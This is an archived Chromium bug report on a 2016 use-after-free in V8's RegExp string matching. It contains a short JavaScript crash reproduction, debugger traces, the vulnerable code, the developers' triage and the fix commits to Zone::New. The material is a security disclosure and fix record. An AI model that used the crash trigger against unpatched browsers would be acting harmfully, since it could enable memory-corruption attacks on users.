# Security: Use After Free in RegExp of V8

| Field | Value |
|-------|-------|
| **Issue ID** | [40084159](https://issues.chromium.org/issues/40084159) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink>JavaScript |
| **Reporter** | cw...@gmail.com |
| **Assignee** | jk...@chromium.org |
| **Created** | 2016-04-23 |
| **Bounty** | $3,000.00 |

## Description

**VULNERABILITY DETAILS**  

"match" function with a very long string fails to properly allocate a memory, thus UAF occurs.

**VERSION**  

Windows Chrome 50.0.2661.87 32bit stable (V8 5.0.71.33)

## **REPRODUCTION CASE**

<script>
r2 = new RegExp("(?=)\\*", "g");
s0 = Array(220000700).join('a'); // the size could be different between v8 and chrome
result = s0.match(r2);
</script>

---

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**

runtime/runtime-strings.cc  

334 RUNTIME\_FUNCTION(Runtime\_StringMatch) {  

..  

349 ZoneScope zone\_scope(isolate->runtime\_zone());  

350 ZoneList<int> offsets(8, zone\_scope.zone());  

351  

352 while (true) {  

353 int32\_t\* match = global\_cache.FetchNext();  

354 if (match == NULL) break;  

355 offsets.Add(match[0], zone\_scope.zone()); // start <----------  

356 offsets.Add(match[1], zone\_scope.zone()); // end  

357 }  

..

"Add" method invocation tries to resize ZoneList when the length of offsets reaches the capacity, but there's no limitation check.

The reproduction code sometimes causes to copy to freed-memory in chrome.

0:000> u  

0550020f f30f7f47f0 movdqu xmmword ptr [edi-10h],xmm0  

05500214 89fa mov edx,edi  

05500216 83e20f and edx,0Fh  

05500219 2bfa sub edi,edx  

0550021b 2bf2 sub esi,edx  

0550021d 2bca sub ecx,edx  

0550021f 89ca mov edx,ecx  

05500221 c1ea06 shr edx,6  

0:000> dd edi  

46018020 ???????? ???????? ???????? ????????  

46018030 ???????? ???????? ???????? ????????

- 447e0000 4c400000 7c20000 MEM\_FREE PAGE\_NOACCESS

In d8 binary, string pointer is pointing one of elements of the offsets list.

v8::internal::Map::instance\_type (this=0x240ec0c) at .././src/objects-inl.h:4268  

4268 return static\_cast<InstanceType>(READ\_BYTE\_FIELD(this, kInstanceTypeOffset));  

(gdb) print this  

$1 = (v8::internal::Map \*) 0x240ec0c  

(gdb) bt  

#0 v8::internal::Map::instance\_type (this=0x240ec0c) at .././src/objects-inl.h:4268  

#1 0x08801ebf in v8::internal::HeapObject::IsString (this=0xf3708081) at .././src/objects-inl.h:164  

#2 0x0886af5a in v8::internal::HeapObject::IsConsString (this=0xf3708081) at .././src/objects-inl.h:202  

#3 0x0883347e in v8::internal::String::Flatten (string=..., pretenure=v8::internal::NOT\_TENURED) at .././src/objects-inl.h:3421  

#4 0x08c2831d in v8::internal::Factory::NewProperSubString (this=0xa1d2c38, str=..., begin=0, end=0) at ../src/factory.cc:597  

#5 0x08e27ff0 in v8::internal::Factory::NewSubString (this=0xa1d2c38, str=..., begin=0, end=0) at .././src/factory.h:215  

#6 0x093ed7b3 in v8::internal::\_\_RT\_impl\_Runtime\_StringMatch (args=..., isolate=0xa1d2c38) at ../src/runtime/runtime-strings.cc:372  

#7 0x093ed256 in v8::internal::Runtime\_StringMatch (args\_length=3, args\_object=0xffffd014, isolate=0xa1d2c38)  

at ../src/runtime/runtime-strings.cc:334  

#8 0x2230b81c in ?? ()

## Timeline

### va...@chromium.org (2016-04-24)

Thanks for the report! I've reproed this on the current stable Chrome.
+v8 folks. Could you please look into this, or find a more suitable owner?

[Monorail components: Blink>JavaScript]

### va...@chromium.org (2016-04-24)

[Empty comment from Monorail migration]

### va...@chromium.org (2016-04-25)

Marking Security_Severity-High based on the severity of other similar bugs.
Bug oweners, please feel free to change it if this isn't appropriate.

### va...@chromium.org (2016-04-25)

[Empty comment from Monorail migration]

### ha...@chromium.org (2016-04-25)

[Empty comment from Monorail migration]

### ya...@chromium.org (2016-04-25)

Interesting. This seems not really regexp-related, but more an issue with the ZoneList, and could happen elsewhere that also uses a ZoneList.

But if I'm reading this correctly, the ZoneList uses the ZoneAllocationPolicy, which, when invoking .New(), should trigger V8::FatalProcessOutOfMemory if expanding the zone fails. I'm a bit puzzled by this. Trying to reproduce.

### ha...@chromium.org (2016-04-25)

[Empty comment from Monorail migration]

### ha...@chromium.org (2016-04-25)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-04-25)

[Empty comment from Monorail migration]

### hp...@chromium.org (2016-04-26)

This is not a GC issue. Assigning to Yang since he is already working on it.

### ya...@chromium.org (2016-04-26)

I have not been able to reproduce this and unfortunately have no time to work on this. Michael, could you find a new owner for this?

### ha...@chromium.org (2016-04-28)

Toon, I think you were talking about this yesterday? Is this the same thing?

### jk...@chromium.org (2016-04-28)

I've debugged this with Toon yesterday. Fix: https://codereview.chromium.org/1930873002 (should be merged back after Canary coverage).

### ha...@chromium.org (2016-04-28)

Awesome, thanks.

### cl...@chromium.org (2016-04-28)

Please mark security bugs as fixed as soon as the fix lands, and before requesting merges.

- Your friendly ClusterFuzz

### cl...@chromium.org (2016-04-29)

[Empty comment from Monorail migration]

### bu...@chromium.org (2016-04-29)

The following revision refers to this bug:
  https://chromium.googlesource.com/v8/v8.git/+/3a9bfecfe41737aaf0dbf92ce68352f8acaaaf73

commit 3a9bfecfe41737aaf0dbf92ce68352f8acaaaf73
Author: jkummerow <jkummerow@chromium.org>
Date: Fri Apr 29 11:53:59 2016

Fix overflow issue in Zone::New

When requesting a large allocation near the end of the address space,
the computation could overflow and erroneously *not* grow the Zone
as required.

BUG=chromium:606115
LOG=y

Review-Url: https://codereview.chromium.org/1930873002
Cr-Commit-Position: refs/heads/master@{#35903}

[modify] https://crrev.com/3a9bfecfe41737aaf0dbf92ce68352f8acaaaf73/src/zone.cc


### jk...@chromium.org (2016-05-03)

[Empty comment from Monorail migration]

### ti...@google.com (2016-05-03)

Your change meets the bar and is auto-approved for M51 (branch: 2704)

### ti...@google.com (2016-05-03)

[Automated comment] Request affecting a post-stable build (M50), manual review required.

### ti...@google.com (2016-05-03)

[Automated comment] Request affecting a post-stable build (M50), manual review required.

### bu...@chromium.org (2016-05-04)

The following revision refers to this bug:
  https://chromium.googlesource.com/v8/v8.git/+/36d0d2ed2a0d9088808b261f49d78f0a14b7d0ce

commit 36d0d2ed2a0d9088808b261f49d78f0a14b7d0ce
Author: Jakob Kummerow <jkummerow@chromium.org>
Date: Wed May 04 11:05:53 2016

Version 5.1.281.28 (cherry-pick)

Merged 3a9bfecfe41737aaf0dbf92ce68352f8acaaaf73

Fix overflow issue in Zone::New

BUG=chromium:606115
LOG=N
R=cbruni@chromium.org

Review URL: https://codereview.chromium.org/1949973002 .

Cr-Commit-Position: refs/branch-heads/5.1@{#32}
Cr-Branched-From: 167dc63b4c9a1d0f0fe1b19af93644ac9a561e83-refs/heads/5.1.281@{#1}
Cr-Branched-From: 03953f52bd4a184983a551927c406be6489ef89b-refs/heads/master@{#35282}

[modify] https://crrev.com/36d0d2ed2a0d9088808b261f49d78f0a14b7d0ce/include/v8-version.h
[modify] https://crrev.com/36d0d2ed2a0d9088808b261f49d78f0a14b7d0ce/src/zone.cc


### ti...@chromium.org (2016-05-04)

[Empty comment from Monorail migration]

### ha...@chromium.org (2016-05-04)

[Empty comment from Monorail migration]

### bu...@chromium.org (2016-05-04)

The following revision refers to this bug:
  https://chromium.googlesource.com/v8/v8.git/+/557b84becbfe9f6d10c281bb0b2dbb75403a497f

commit 557b84becbfe9f6d10c281bb0b2dbb75403a497f
Author: Jakob Kummerow <jkummerow@chromium.org>
Date: Wed May 04 14:17:19 2016

Version 5.0.71.47 (cherry-pick)

Merged 3a9bfecfe41737aaf0dbf92ce68352f8acaaaf73

Fix overflow issue in Zone::New

BUG=chromium:606115
LOG=N
R=cbruni@chromium.org

Review URL: https://codereview.chromium.org/1945313002 .

Cr-Commit-Position: refs/branch-heads/5.0@{#56}
Cr-Branched-From: ad16e6c2cbd2c6b0f2e8ff944ac245561c682ac2-refs/heads/5.0.71@{#1}
Cr-Branched-From: bd9df50d75125ee2ad37b3d92c8f50f0a8b5f030-refs/heads/master@{#34215}

[modify] https://crrev.com/557b84becbfe9f6d10c281bb0b2dbb75403a497f/include/v8-version.h
[modify] https://crrev.com/557b84becbfe9f6d10c281bb0b2dbb75403a497f/src/zone.cc


### sh...@chromium.org (2016-05-07)

This issue has been approved for a merge. Please merge the fix to any appropriate branches as soon as possible!

If all merges have been completed, please remove any remaining Merge-Approved labels from this issue.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### jk...@chromium.org (2016-05-07)

[Empty comment from Monorail migration]

### ti...@google.com (2016-05-09)

[Empty comment from Monorail migration]

### ti...@google.com (2016-05-12)

[Comment Deleted]

### ti...@google.com (2016-05-12)

Congratulations - $3000 for this report.

I'll add this to the next payment run - thanks again for the report! 

### ha...@chromium.org (2016-06-03)

[Empty comment from Monorail migration]

### ti...@google.com (2016-06-08)

[Empty comment from Monorail migration]

### ti...@google.com (2016-06-08)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-08-05)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### of...@google.com (2016-08-09)

[Empty comment from Monorail migration]

### ha...@chromium.org (2016-09-28)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-04-25)

[Empty comment from Monorail migration]

### is...@google.com (2018-04-25)

This issue was migrated from crbug.com/chromium/606115?no_tracker_redirect=1

[Auto-CCs applied]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40084159)*
